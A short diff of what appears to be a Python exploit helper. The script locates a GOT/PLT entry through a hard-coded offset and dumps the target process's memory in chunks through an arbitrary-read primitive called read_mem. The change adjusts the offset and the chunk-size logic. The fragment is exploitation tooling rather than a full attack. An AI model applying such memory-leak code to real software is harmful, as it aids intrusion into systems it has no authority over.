@@ -18,7 +18,7 @@ else:
 if idx < 0:
     got_func = some_func
 else:
-    plt = some_func - 10063176
+    plt = some_func - 10117000
     plt_entry = plt + idx * 16
     q = read_mem(plt_entry, 6)
     assert q[:2] == b'\xff%', q
@@ -29,7 +29,7 @@ got_func += offset0
 
 data = b''
 
-chunk_sz = 1
+chunk_sz = int(os.environ.get('CHUNK_SIZE', '4096'))
 
 def watchdog_thread():
     input()
@@ -40,8 +40,8 @@ threading.Thread(target=watchdog_thread, daemon=True).start()
 try:
     while True:
         data += read_mem(got_func + len(data), chunk_sz)
-        if chunk_sz < 1024:
-            chunk_sz *= 2
+        #if chunk_sz < 1048576:
+        #    chunk_sz *= 2
         print(len(data), end=' bytes loaded\r')
 except KeyboardInterrupt:
     print('\nKeyboardInterrupt')
